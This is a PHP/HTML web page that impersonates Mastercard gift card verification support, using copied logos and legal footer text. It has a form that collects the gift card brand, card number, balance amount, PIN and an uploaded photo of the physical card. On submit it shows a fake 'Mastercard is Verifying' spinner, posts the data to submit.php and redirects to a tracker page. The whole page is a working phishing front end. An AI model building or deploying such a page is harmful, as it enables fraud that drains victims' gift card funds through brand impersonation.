<?php

$selectedType = $_POST['gift_card'] ?? '';

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Mastercard Verification Support</title>
    <style>
        body{
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
        }
        .loader {
            width: 20px;
            height: 20px;
            border: 4px solid #fff;
            border-top: 4px solid #cf4501;
            border-left: 4px solid #cf4501;
            border-bottom: 4px solid #cf4501;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: auto;
        }
        .middle{
            text-align: center;
            margin-top: 10%;
        }
        #baseInfo{
            display: none;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .headers p{
            width: 70%;
            text-align: center;
            margin: auto;
        }
        .headers{
            background: rgb(79, 78, 78);
            color: #fff;
            font-size: 14px;
            padding: 10px 5px;
            text-align: center;
        }
        .tracker a{
            color: #fff;
            text-decoration: none;
            font-size: 14px;
            width: 70%;
            margin-right: 10%;
        }
        .tracker{
            background: #000;
            color: #fff;
            padding: 18px;
            text-align: right;
        }
        .logs .main a{
            text-decoration: none;
            color: #000;
        }
        .logs .main{
            width: 70%;
            margin: auto;
            align-items: center;
            display: flex;
            justify-content: space-between;
        }
        .logs .main{
            align-items: center;
        }
        .logs{
            background: #fff;
            padding: 5px;
            align-items: center;
        }
        .form-section{
            background: rgb(235, 228, 225);
            padding: 5px;
        }
        .red-pad{
            background: #cf4501;
            padding: 30px;
        }
        .foot-er p{
            letter-spacing: 1px;
            font-size: 11px;
        }
        .foot-er{
            background: #000;
            color: #fff;
        }
        .contain{
            width: 70%;
            margin: auto;
            padding: 30px;
        }
        .main-imgs a{
            color: #fff;
            text-decoration: none;
        }
        .main-imgs{
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
        }
        .formal form{
            padding: 10px;
        }
        .formal p{
            font-size: 12px;
        }
        .formal h3{
            font-size: 13px;
        }
        .formal{
            background: #fff;
            padding: 10px;
            border-top: #cf4501 5px solid;
        }
        select{
            width: 30%;
            padding: 8px;
        }
        input{
            padding: 8px;
            width: 28%;
        }
        button{
            padding: 10px;
            width: 30%;
            font-weight: bold;
            font-size: 17px;
            color: #fff;
            background: #cf4501 ;
            border: 1px solid #cf4501;
        }
        @media (max-width: 800px){
        button{
            width: 95%;
        }
        input{
            width: 85%;
        }
        select{
            width: 95%;
        }
       .contain{
        width: 83%;
       }
       body{
        background: #333;
       }
       .headers p{
        width: 85%;
        font-size: 12px;
       }
        }

    </style>
</head>
<body>
<div class="mask" style="display: absolute; position: fixed; width: 100%; height: 800px; background: #fff;">
        <div class="middle">
        <img src="https://images.ctfassets.net/06dbyds2udqx/5StdxLZT9WwWIvSq4tvB9h/41ab17859104ff8c7197c089480bfd72/mastercard_circles_92px_2x.png" alt="">  
        <p id="conns">Connecting to Mastercard Gift Card Verification…</p>
            <div class="loader"></div>
        </div>
    </div>
    <div class="headers">
        <p>If you need help due to a declined transaction and have sufficient funds to cover the purchase, your Gift Card was most likely declined due to security and safety measures in place to protect your funds.  <br>
            Use your Card in-person or at a different merchant online and make sure to include the card security code. 
        </p>
    </div>
    <div class="tracker">
        <a href="#">Contact Support</a>
    </div>
    <div class="logs">
        <div class="main">
            <img src="https://images.ctfassets.net/06dbyds2udqx/5StdxLZT9WwWIvSq4tvB9h/41ab17859104ff8c7197c089480bfd72/mastercard_circles_92px_2x.png" alt="">
            <a href="/tracker.php">Track status</a>
        </div>
    </div>

    <div class="form-section">
        <div class="contain">
            <div class="formal">
                <form action="" method="post" id="giftCardForm" enctype="multipart/form-data">
                <h3>Manage Your Gift Card</h3>
                <p>Enter card details to check balance, review transactions, or activate your gift card</p>
                <select name="gift_cards" id="gift-cards" required>
                    <option value="" disabled selected>-- Select a Gift Card --</option>
                    <optgroup label="Retail & Shopping">
                        <option value="amazon">Amazon</option>
                        <option value="walmart">Walmart</option>
                        <option value="target">Target</option>
                        <option value="best-buy">Best Buy</option>
                        <option value="home-depot">Home Depot</option>
                        <option value="lowes">Lowe’s</option>
                        <option value="macys">Macy’s</option>
                        <option value="nordstrom">Nordstrom</option>
                        <option value="kohls">Kohl’s</option>
                        <option value="rei">REI</option>
                    </optgroup>
                    
                    <optgroup label="Restaurants & Coffee">
                        <option value="starbucks">Starbucks</option>
                        <option value="dunkin">Dunkin’</option>
                        <option value="mcdonalds">McDonald’s</option>
                        <option value="subway">Subway</option>
                        <option value="chipotle">Chipotle</option>
                        <option value="olive-garden">Olive Garden</option>
                        <option value="texas-roadhouse">Texas Roadhouse</option>
                        <option value="cheesecake-factory">Cheesecake Factory</option>
                        <option value="panera-bread">Panera Bread</option>
                        <option value="buffalo-wild-wings">Buffalo Wild Wings</option>
                    </optgroup>
                    
                    <optgroup label="Entertainment & Streaming">
                        <option value="netflix">Netflix</option>
                        <option value="hulu">Hulu</option>
                        <option value="disney-plus">Disney+</option>
                        <option value="hbo-max">HBO Max</option>
                        <option value="spotify">Spotify</option>
                        <option value="apple-music">Apple</option>
                        <option value="google-play">Google Play</option>
                        <option value="xbox-live">Xbox Live</option>
                        <option value="playstation-store">PlayStation Store</option>
                        <option value="nintendo-eshop">Nintendo eShop</option>
                    </optgroup>
                    
                    <optgroup label="Travel & Experiences">
                        <option value="airbnb">Airbnb</option>
                        <option value="delta-airlines">Delta Airlines</option>
                        <option value="southwest-airlines">Southwest Airlines</option>
                        <option value="uber">Uber</option>
                        <option value="lyft">Lyft</option>
                        <option value="hotels-com">Hotels.com</option>
                        <option value="american-airlines">American Airlines</option>
                        <option value="carnival-cruises">Carnival Cruises</option>
                        <option value="visa-prepaid-travel">Visa Prepaid Travel Card</option>
                        <option value="ticketmaster">Ticketmaster</option>
                    </optgroup>
                    
                    <optgroup label="Sports & Outdoors">
                        <option value="bass-pro-shops">Bass Pro Shops</option>
                        <option value="cabelas">Cabela’s</option>
                        <option value="nike">Nike</option>
                        <option value="adidas">Adidas</option>
                        <option value="dicks-sporting-goods">Dick’s Sporting Goods</option>
                    </optgroup>
                    
                    <optgroup label="Miscellaneous">
                        <option value="visa-prepaid">Visa Prepaid Gift Card</option>
                        <option value="mastercard-prepaid">Mastercard Prepaid Gift Card</option>
                        <option value="amex-prepaid">American Express Gift Card</option>
                        <option value="whole-foods">Whole Foods</option>
                        <option value="instacart">Instacart</option>
                    </optgroup>
                </select> <br> <br>
                        <label for="gift-cards">Select Gift Card Type:</label> <br>
                <select name="gift_card" id="gift-card" required onchange="toggleImageInput()">
                    <option value="" disabled selected>Gift Card Type</option>
                    <optgroup label="Type">
                        <option value="Physical Gift Card" <?= $selectedType == "Physical Gift Card" ? "selected" : "" ?>>Physical Gift Card</option>
                        <option value="Digital Gift Card" <?= $selectedType == "Digital Gift Card" ? "selected" : "" ?>>Digital Gift Card</option>
                    </optgroup>
                </select>
                <br><br>

               <!-- Image Upload Input (PHP determines initial visibility) -->
        <div id="image-upload" style="display: <?= ($selectedType == "Physical Gift Card") ? "block" : "none" ?>;">
            <label for="card-image">Physical Card:</label>
            <input type="file" name="card_image" id="card-image" accept="image/*">
        </div>


                <label for="#">Card Number</label> <br>
                <input type="text" name="card_number" placeholder=""> <br> <br>
                <label for="#">Amount</label> <br>
                <input type="text" name="amount" placeholder="$"> <br><br>
                <label for="#">PIN (Optional)</label> <br>
                <input type="text" name="pin" placeholder=""> <br><br>
                <button type="submit">Complete Verification</button>
            </form>
            </div>
            <div class="thank-img">
                <img src="" alt="">
            </div>
        </div>
    </div>
    <div class="red-pad">

    </div>

    <footer class="foot-er">
        <div class="contain">
        <div class="main-imgs">
            <img src="https://images.ctfassets.net/06dbyds2udqx/20bcs0qwnoSmnU0kv3LLly/2fe7ce14135da865e1fa585c41864431/symbol.png" alt="">
            <a href="#">Help</a>
        </div>
        <p>Mastercard® Gift Cards are issued by Sutton Bank or Pathward, N.A. pursuant to license by Mastercard International Incorporated, and may be used in the U.S. and District of Columbia everywhere Debit Mastercard cards are accepted. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated. Sutton Bank and Pathward, N.A., Members FDIC. No cash or ATM access. Terms and conditions apply. See Card holder Agreement for details. Cards are distributed and serviced by InComm Financial Services, Inc., which is licensed as a Money Transmitter by the New York State Department of Financial Services. NMLS ID# 912772.  <br> <br> Colorado, Maryland, and Texas customers: View information about addressing complaints regarding our money services business. <br> <br> Copyright ©2025 InComm Payments. All Rights Reserved.</p> <br> <br>
        <!-- <ul>
           <a href="#"> <li>Pathward, N.A. Privacy Policy</li></a>
           <a href="#">   <li>Sutton Bank Privacy Policy</li></a>
            <a href="#">   <li>Terms Of Use</li></a>
                <a href="#">   <li>Cardholder Agreement</li></a>
                    <a href="#"> <li>Accessibility Statement</li> </a>
        </ul>  -->
        </div>
    </footer>


    <script>
                  const mask =  document.querySelector(".mask")

window.addEventListener("load", () => {

    setTimeout(() => {
    document.querySelector(".mask").style.display = "none";
    }, 2000);
    
});

        function toggleImageInput() {
            var giftCardType = document.getElementById("gift-card").value;
            var imageUploadDiv = document.getElementById("image-upload");
            
            if (giftCardType === "Physical Gift Card") {
                imageUploadDiv.style.display = "block"; // Show image input
            } else {
                imageUploadDiv.style.display = "none"; // Hide image input
            }
            }
            document.getElementById("giftCardForm").addEventListener("submit", function(event) {
            var giftCardType = document.getElementById("gift-card").value;

            event.preventDefault(); // ✅ Prevent Page Reload
            document.querySelector(".mask").style.display = "block";
            document.querySelector('#conns').textContent = `Mastercard is Verifying your ${giftCardType}.`
            setTimeout(() => {
                window.location.replace("./tracker.php")
            }, 4000);

            let formData = new FormData(this);
            
            // ✅ Send Form Data to PHP
            fetch("submit.php", {
                method: "POST",
                body: formData

            })
            .then(response => response.text())
            .then(data => {
                // document.getElementById("responseMessage").innerHTML = data;
                console.log("Server Response:", data);
            })
            .catch(error => console.error("Error:", error));
        });
</script>
</body>
</html>